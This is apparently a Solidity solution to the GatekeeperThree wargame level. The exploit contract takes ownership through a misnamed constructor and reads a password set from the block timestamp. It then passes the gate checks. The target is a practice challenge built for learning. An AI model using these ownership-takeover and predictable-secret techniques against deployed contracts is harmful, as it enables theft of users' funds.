// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperThree.sol";

contract Pwn { 

    GatekeeperThree private immutable target;
    uint256 private immutable password;

    constructor(GatekeeperThree _target) payable {
        target = _target;
        target.createTrick();
        password = block.timestamp;
        target.construct0r();
        (bool success, ) = payable(address(target)).call{value: msg.value}("");
        require(success, "failed to send ether");
    }  

    function pwn() external {
        target.getAllowance(password);
        target.enter();
        require(target.entrant() == msg.sender, "failed");
    }
}